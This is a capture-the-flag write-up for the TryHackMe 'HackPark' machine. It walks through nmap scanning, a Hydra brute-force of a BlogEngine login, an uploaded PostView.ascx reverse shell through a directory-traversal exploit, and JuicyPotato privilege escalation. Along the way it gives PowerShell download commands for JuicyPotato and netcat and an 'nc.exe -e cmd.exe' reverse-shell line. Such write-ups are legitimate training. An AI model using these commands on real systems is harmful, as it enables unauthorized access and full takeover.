This is a write-up for the HackPark machine on the TryHackme platform. We tackled this pentesting exercise using the approach and methodology of OSCP.

![[Imagenes/HackPark/portada.png]]

---
## Enumeration

We are going to be using the Nmap tool to scan the machine for possible vulnerabilities and obtain an initial access point.

The machine seems to have ICMP requests disabled, as when we send a ping, there is no response. However, if we use the following Nmap scan, we can see that it indicates the host is active.


![[Imagenes/HackPark/1.png]]

Once we have ensured that we have connectivity with the host, we will perform the usual scan, but it is important to add the -Pn option to avoid ICMP requests.

	sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn 10.10.44.157 -oG allPorts


![[Imagenes/HackPark/2.png]]

-   `sudo`: Runs the command with administrative privileges.
-   `nmap`: The command we are running.
-   `-p-`: Scans all ports.
-   `-sS`: Uses a SYN scan to determine the state of the ports.
-   `--min-rate 5000`: Sets the minimum packet sending rate to 5000 packets per second.
-   `--open`: Shows only open ports.
-   `-T5`: Sets the timing template to 5, which makes the scan faster but also more aggressive.
-   `-vvv`: Sets the verbosity level to 3, which provides more detailed output.
-   `-n`: Treats all hostnames as IPs, skipping DNS resolution.
-   `-Pn`: Skips host discovery by not sending an ICMP ping.
-   `10.10.44.157`: The IP address of the target machine to be scanned.
-   `-oG allPorts`: Outputs the results in the grepable format to a file named "allPorts".

We can see that the machine has 2 open ports, 80 and 3389. We know that a web service is running on port 80, but before we browse to the webpage, we will launch a series of basic reconnaissance scripts with Nmap to determine which version is running.

	sudo nmap -sVC -p80 -Pn  10.10.44.157

![[Imagenes/HackPark/3.png]]

![[Imagenes/HackPark/4.png]]

When we access the webpage, there are several things we should pay attention to. The first thing I noticed was that there was a post uploaded by the user "admin," which means we already have a user to test default credentials or use for a brute-force attack. The question is, where can we perform this test? As we continue browsing, we found a login at the following address.

	http://10.10.44.157/Account/login.aspx?ReturnURL=/admin/

![[Imagenes/HackPark/5.png]]

Before trying any brute-force attack, I decided to inspect the page and found the version of Blog Engine being used, which is Blog Engine 3.3.6.0.

![[Imagenes/HackPark/6.png]]

By searching for this version on Google, we found a Directory Traversal/Remote Code Execution vulnerability. However, to exploit this vulnerability and gain initial access, we need to log in as a user.

Right now we have a valid user, the author of the post, who is "administrator."

If we perform reverse image search on the clown image, we find that it references Pennywise.

It's possible that "Pennywise" could be another valid user, but we cannot confirm this without further information or attempting to log in with this username.

Ready to perform a brute-force attack on the page, there are several tools that you can use, such as Hydra, Burp Suite Intruder, or WFuzz. It's important to note that brute-forcing is not always successful and can lead to account lockout or IP blocking, so it should be used with caution and only on systems that you have permission to test. It's also recommended to use a wordlist that includes commonly used passwords and not to rely solely on the default username and password combinations.

Since Hydra is allowed in the OSCP exam, we're going to use this tool.

There are several things to consider when using this tool. The first is the word list that we're going to use, and the second is to detect in which parameters we want to inject these words.

We're going to need the -l flag, where we will put a username. Since we know for sure that the admin user exists, we'll try with that one.

	-l: admin
	-P: The path of the wordlist that we're going to use.
	Followed by the IP address that hosts the web server.
	The method used by the form to submit the data, in our case, it is http-post-form.

We must provide the path where the values should be injected.

To find out the route where the values need to be injected, we can use Burp Suite to intercept the form request or we can use the browser's built-in inspection tool

To the second option, the following website was very useful for me. [WebSite](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)



Final command:

	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.44.157 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=W1UcrOTkoRaGvqB9lcU%2B3HEsKay6%2F0hsXzSDCa5pSb2IqmN3ONWFGqKmNYJAKYMQfM%2F5cw7OG2UF2fhT8K4tmkbWJ3EdCDWZEQbJsXghW9Bujyvx9wUbA2na2Zi2lNwCie%2B%2FQ65cpAtBQhYdowF8gJ1hZ5d8rixsZP%2FiMJMK87dnkScsZqXQC8DDnt2%2BoUKJ5qmo0%2FbTC%2Bnl%2BMsAPVBHFkhE9FuzbduomdTw2mH5nrploXc5SpujZ5H49S%2BfZ7xGYYLqOWRNshS0XRIlsq%2FgAJqndtfTgcpSLI9Wim7Sm6qIb9keAIEkQ4ZnGzEy1Wh8Ij2ldhpndhZoTuI5zHEVxxnzBQwfhwVfgRRopMQDNeZat6qx&__EVENTVALIDATION=eJbll7x6cguuec%2F4hO2MIzAbYAsagKL3ZQSJrTntwo%2FnDaxJnYUtfEZFD2jGqHQerDYFgK4PjYAkoG3X%2FOLO7d303cnughgt2o3eE89ZsHjy86pmDFm8nedB%2Fz%2FkmqgRBAXQ6DWGf%2F9W5LCADx3uGVcshXGBIGPCILPc8z5j5diUzTIt&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"


![[Imagenes/HackPark/7.png]]

![[Imagenes/HackPark/8.png]]

![[Imagenes/HackPark/9.png]]

Following the steps from the previously mentioned page, we can obtain all the necessary parameters to perform the injection. It is important to add the two colons before "__VIEWSTATE" to indicate to Hydra the variable we are going to attack.

The parameters we modify in the entire request are UserName and Password.

Is important to add a colon at the end of the parameters and specify the error message that Hydra should detect to know that the login attempt was unsuccessful.


Finally, we were able to obtain the password for the admin user.

## Initial Access 

We already have credentials for the web service administrator. To obtain initial access, we will resort to the script that we mentioned during the enumeration phase. [exploit](https://www.exploit-db.com/exploits/46353)

We just need to follow the instructions of the script.

![[Imagenes/HackPark/10.png]]

![[Imagenes/HackPark/11.png]]

We will change the TcpClient parameter by indicating our IP and port, where we will receive a reverse shell from the machine through a netcat listener. It is important to rename the file to "PostView.ascx".

![[Imagenes/HackPark/12.png]]

We're going to navigate to the path

	http://10.10.241.66/admin/app/editor/editpost.cshtml


![[Imagenes/HackPark/13.png]]

![[Imagenes/HackPark/14.png]]

And we upload our modified payload.

Finally, to receive the shell, we must navigate to the following path, it's ikmportant to have the listener up

	http://10.10.241.66/?theme=../../App_Data/files

We should have received the victim machine's command prompt by now.


![[Imagenes/HackPark/14.png]]


## Privilege escalation

It is important to note that the user who returns the shell to us is a user who is used to manage the web service and has very low privileges.

As in other write-ups, the first thing I do is enumerate the privileges that a user has. In this case, when I do so, I see that the user has the SeImpersonatePrivilege privilege enabled.

Seeing that we have permissions over this service should catch our attention because it implies that we have ensured privilege escalation.

Just like in the Alfred machine, we are going to use the JuicyPotato tool. In real environments, it is highly detected, but it is an alternative to not using Metasploit. [JuicyPotato]( https://github.com/ohpe/juicy-potato/releases)

SeImpersonatePrivilege is a permission that allows a process to impersonate the identity of another user, which is useful for authentication and authorization in server applications and in applications that need to interact with the operating system. However, this permission can also be exploited by an attacker if they gain access to a user account that has the SeImpersonatePrivilege permission and then use it to escalate their own privileges or to execute malicious commands with the user's privileges.

We need to upload that executable to the machine. To do so, we will create an HTTP server with Python and download it from the victim machine using the `Invoke-Expression` tool.

```
powershell -command "iex(New-Object Net.WebClient).downloadFile('http://10.14.49.189:8080/JuicyPotato.exe', 'C:\Users\Public\JuicyPotato.exe')" -bypass executionpolicy"
```

To successfully carry out privilege escalation, we need to upload the netcat binary, which can be found in our Kali Linux system using the `locate nc.exe` command

```
powershell -command "iex(New-Object Net.WebClient).downloadFile('http://10.14.49.189:8080/nc.exe', 'C:\Users\Public\nc.exe')" -bypass executionpolicy"
```

We run JuicyPotato, which can be guided by the guide on the GitHub repository or directly from the help shown in the console.

Here's an explanation of each of the parameters used in the command:

-   `-l 1337`: specifies the local port that the COM server will listen on for incoming connection.
-   `-p c:\windows\system32\cmd.exe`: specifies the program to use for the privilege escalation attack. In this case, it is the cmd.exe command that is located in the Windows system folder.
-   `-a "/c c:\users\public\nc.exe -e cmd.exe 10.14.49.189 443"`: specifies the command to execute when the privilege escalation occurs. In this case, the nc.exe (Netcat) program is being used to establish a reverse connection to a specified remote IP and port.
-   `-t *`: specifies the type of token to use for the attack. The value '*' indicates that any available token with the necessary permissions for privilege escalation will be used.

A COM server is a software component that runs on Windows and provides a programming interface for client programs to communicate with it and use its services. COM servers are an important part of component technology in Windows and are widely used for application integration and development.

```
JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.14.49.189 443" -t *
```

 Establish a listening port on our machine and run the command,  receiving a shell as the administrator user obtaining both flags

![[Imagenes/HackPark/15.png]]

![[Imagenes/HackPark/16.png]]


